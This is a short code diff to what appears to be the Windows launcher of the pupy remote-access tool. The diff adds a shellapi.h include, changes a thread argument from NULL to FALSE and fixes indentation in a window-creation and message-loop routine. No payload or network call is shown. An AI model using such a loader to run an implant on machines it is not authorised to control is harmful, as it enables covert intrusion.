@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+#include <shellapi.h>
 #include "pupy_load.h"
 #include "debug.h"
 
@@ -57,9 +58,9 @@ int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     wx.lpszClassName = class_name;
 
     if ( ! RegisterClassEx(&wx) ) {
-		dprint("RegisterClassEx failed: %d\n", GetLastError());
+        dprint("RegisterClassEx failed: %d\n", GetLastError());
         return -1;
-	}
+    }
 
     hwndMain = CreateWindowEx(
          0,
@@ -70,50 +71,50 @@ int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     );
 
     if (!hwndMain) {
-		dprint("CreateWindowEx failed: %d\n", GetLastError());
-		return -2;
-	}
+        dprint("CreateWindowEx failed: %d\n", GetLastError());
+        return -2;
+    }
 
     hThread = CreateThread(
         NULL,
         0,
         mainThread,
-        NULL,
+        FALSE,
         0,
         &threadId
     );
 
     if (!hThread) {
-		dprint("CreateThread failed: %d\n", GetLastError());
+        dprint("CreateThread failed: %d\n", GetLastError());
         return -GetLastError();
     }
 
-	for (;;) {
-		dwWake = MsgWaitForMultipleObjects(
-			1,
-			&hThread,
-			FALSE,
-			INFINITE,
-			QS_ALLINPUT
+    for (;;) {
+        dwWake = MsgWaitForMultipleObjects(
+            1,
+            &hThread,
+            FALSE,
+            INFINITE,
+            QS_ALLINPUT
         );
 
-		switch (dwWake) {
-		case WAIT_FAILED:
-			return -3;
+        switch (dwWake) {
+        case WAIT_FAILED:
+            return -3;
 
-		case WAIT_TIMEOUT:
-			continue;
+        case WAIT_TIMEOUT:
+            continue;
 
-		case WAIT_OBJECT_0:
-			return 0;
+        case WAIT_OBJECT_0:
+            return 0;
 
-		case WAIT_OBJECT_0 + 1:
-			while (PeekMessage( &msg, NULL, 0, 0, PM_REMOVE)) {
-				TranslateMessage(&msg);
-				DispatchMessage(&msg);
-			}
-			break;
-		}
+        case WAIT_OBJECT_0 + 1:
+            while (PeekMessage( &msg, NULL, 0, 0, PM_REMOVE)) {
+                TranslateMessage(&msg);
+                DispatchMessage(&msg);
+            }
+            break;
+        }
     }
 
     // We should never get here
@@ -122,6 +123,6 @@ int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 #else
 int main()
 {
-    mainThread(NULL);
+    mainThread(FALSE);
 }
 #endif
